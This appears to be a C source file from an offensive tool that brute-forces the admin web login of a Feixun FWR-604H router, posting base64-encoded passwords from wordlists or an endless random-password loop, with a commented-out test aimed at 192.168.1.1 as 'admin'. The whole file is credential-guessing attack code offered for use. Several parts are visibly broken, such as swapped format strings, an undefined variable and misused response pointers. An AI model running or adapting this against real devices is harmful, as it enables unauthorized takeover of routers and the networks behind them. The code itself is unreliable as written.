#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../main.h"
#include "guess.h"

// from ../core/debug.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmtstring, ...);
extern int DisplayInfo(const char *fmtstring, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmtstring, ...);

// from ../core/str.c
extern int FreeRandomPasswordBuff(char *password);
extern int GetRandomPassword(char **rebuf, unsigned int seed, const int length);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern int FreeSplitURLBuff(pSplitURLOutput p);

// from ../core/http.c
extern int FreeHTTPPostMethodBuff(char *p);
extern size_t HTTPPostMethod(const char *url, const char *request, char **response, int debug_level);

// from ../core/base64.c
extern int Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
extern size_t Base64Decode(unsigned char **buffer, char *b64message);

// from ../core/dispatch.c
extern int TaskAssignmentForFile(const char *path, pStringHeader *output, int flag, const int process_num, const int thread_num, const int serial_num);

// form ../core/str.c
extern int FreeProcessFileBuff(pStringHeader p);

char *REQUEST;
char *REQUEST_DATA;
char *SUCCESS_OR_NOT;

static int FreeMatchModel(pMatchOutput p)
{
    free(p);
    return 0;
}

static int MatchModel(pMatchOutput *output, const char *input)
{
    // rude way
    if (strstr(input, "feixun_fwr_604h"))
    {
        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
        (*output)->request = FEIXUN_FWR_604H_REQUEST;
        (*output)->request_data = FEIXUN_FWR_604H_REQUEST_DATA;
        (*output)->success_or_not = FEIXUN_FWR_604H_SUCCESS;
        (*output)->next = NULL;
    }

    else if (strstr(input, "not_sure"))
    {
        //pMatchOutput header = *output;
        MatchModel(output, "feixun_fwr_604h");
        //(*output) = (*output)->next;
        //MatchModel((*output)->next, "others")
    }

    return 0;
}

static int UListPList(char *url, pStringHeader u_header, pStringHeader p_header)
{
    // username is a list and password is list too
    size_t u_len = u_header->length;
    size_t p_len = p_header->length;
    size_t u_i, p_i;
    pStringNode u = u_header->next;
    pStringNode p = p_header->next;
    char *b64message;
    char *response;
    char send_buff[strlen(REQUEST) + MAX_SEND_DATA_SIZE];
    char data_buff[MAX_SEND_DATA_SIZE];
    pSplitURLOutput sp;

    SplitURL(url, &sp);
    for (u_i = 0; u_i < u_len; u_i++)
    {
        for (p_i = 0; p_i < p_len; p_i++)
        {
            // base64
            memset(send_buff, 0, sizeof(send_buff));
            memset(data_buff, 0, sizeof(data_buff));
            Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str));

            // combined data now
            sprintf(data_buff, REQUEST, u->str, b64message);
            sprintf(send_buff, REQUEST_DATA, sp->host, url, strlen(data_buff), data_buff);

            // send now
            HTTPPostMethod(url, send_buff, &response, 0);
            DisplayInfo(response);
            FreeHTTPPostMethodBuff(*response);
            p = p->next;
        }
        u = u->next;
    }
    FreeSplitURLBuff(sp);
    return 0;
}

static int UOnePRandom(const char *url, const char *username, unsigned int seed, const int length)
{
    // just one username and use random password

    char *password;
    char *b64message;
    char send_buff[strlen(REQUEST) + MAX_SEND_DATA_SIZE];
    char data_buff[MAX_SEND_DATA_SIZE];
    char *response;
    pSplitURLOutput sp;
    SplitURL(url, &sp);

    for (;;)
    {

        if (GetRandomPassword(&password, seed, length))
        {
            DisplayError("GetRandomPassword failed");
            return -1;
        }

        // base64
        if (Base64Encode(&b64message, (unsigned char *)password, strlen(password)))
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        sprintf(data_buff, REQUEST_DATA, username, b64message);
        sprintf(send_buff, REQUEST, sp->host, url, strlen(data_buff), data_buff);

        // send now
        //DisplayInfo("*********************");
        //DisplayInfo("url: %s", url);
        if (HTTPPostMethod(url, send_buff, response, 0))
        {
            DisplayError("HTTPPostMethod failed");
            return -1;
        }
        DisplayInfo(response);
        
        if (FreeHTTPPostMethodBuff(response))
        {
            DisplayError("FreeHTTPPostMethodBuff failed");
            return -1;
        }
        if (FreeRandomPasswordBuff(password))
        {
            DisplayError("FreeRandomPasswordBuff failed");
            return -1;
        }
    }

    return 0;
}

static UOnePList(const char *url, const char *username, const pStringHeader p_header)
{
    pStringNode p = p_header->next;
    char *b64message;
    char *response;
    char send_buff[strlen(REQUEST) + MAX_SEND_DATA_SIZE];
    char data_buff[MAX_SEND_DATA_SIZE];
    pSplitURLOutput sp;
    size_t p_i;
    size_t p_len = p_header->length;

    if (SplitURL(url, &sp))
    {
        DisplayError("SplitURL failed");
        return -1;
    }

    for (p_i = 0; p_i < p_len; p_i++)
    {
        // base64
        memset(send_buff, 0, sizeof(send_buff));
        memset(data_buff, 0, sizeof(data_buff));
        if (Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)))
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        sprintf(data_buff, REQUEST, u->username, b64message);
        sprintf(send_buff, REQUEST_DATA, sp->host, url, strlen(data_buff), data_buff);

        // send now
        if (HTTPPostMethod(url, send_buff, &response, 0))
        {
            DisplayError("HTTPPostMethod failed");
            return -1;
        }

        DisplayInfo(response);
        if (FreeHTTPPostMethodBuff(*response))
        {
            DisplayError("FreeHTTPPostMethodBuff failed");
            return -1;
        }
        p = p->next;
    }

    return 0;
}

int Attack_GuessUsernamePassword(pInput input)
{
    // start attack

    pMatchOutput mt;
    MatchModel(&mt, input->model_type);
    REQUEST = mt->request;
    REQUEST_DATA = mt->request_data;
    SUCCESS_OR_NOT = mt->success_or_not;

    if (strlen(input->username_path) > 0)
    {
        // if path existed, ignore the usename
        pStringHeader u_header;

        TaskAssignmentForFile(input->username_path, &u_header, 0, input->process_num, input->thread_num, input->serial_num);
        if (strlen(input->password_path) > 0)
        {
            pStringHeader p_header;
            TaskAssignmentForFile(input->password_path, &p_header, 1, input->process_num, input->thread_num, input->serial_num);
            UListPList(input->address, u_header, p_header);
            FreeProcessFileBuff(u_header);
            FreeProcessFileBuff(p_header);
        }
        // else will never happen
    }
    else if (strlen(input->username) > 0)
    {
        // use one username
        if (strlen(input->password_path) > 0)
        {
            pStringHeader p_header;
            TaskAssignmentForFile(input->password_path, &p_header, 1, input->process_num, input->thread_num, input->serial_num);
            UOnePList(input->address, input->username, p_header);
            FreeProcessFileBuff(p_header);
        }
        else
        {
            UOnePRandom(input->address, input->username, (unsigned int)input->seed, input->random_password_length);
        }
    }
    else
    {
        DisplayError("Input illegal");
        return -1;
    }

    FreeMatchModel(mt);
    return 0;
}

/*
int main(void)
{

    // random password do job
    char *password;
    unsigned int seed = 10;
    int length = 8;

    GetRandomPassword(&password, seed, length);
    DisplayInfo("random password: %s", password);

    // base64 do job
    char *b64message;
    Base64Encode(&b64message, password, strlen(password));

    // combined data now
    char send_buff[strlen(FEIXUN_FWR_604H_REQUEST) + MAX_SEND_DATA_SIZE];
    char *url = "http://192.168.1.1/login.asp";
    pSplitURLOutput sp;

    char send_data_buff[MAX_SEND_DATA_SIZE];
    sprintf(send_data_buff, FEIXUN_FWR_604H_REQUEST_DATA, "admin", b64message);

    SplitURL(url, &sp);
    //DisplayInfo("%ld", strlen(send_data_buff));
    sprintf(send_buff, FEIXUN_FWR_604H_REQUEST, sp->host, url, strlen(send_data_buff), send_data_buff);
    //DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "Send:\n%s\n", send_buff);

    // send now
    char *response;
    //DisplayInfo("*********************");
    //DisplayInfo("url: %s", url);
    HTTPPostMethod(&response, url, send_buff, 0);
    DisplayInfo(response);

    FreeRandomPasswordBuff(password);
    FreeSplitURLBuff(sp);
    FreeHTTPPostMethodBuff(response);

    // test match model
    pMatchOutput mt;
    MatchModel(&mt, "feixun_fwr_604h");
    FreeMatchModel(mt);

    return 0;
}
*/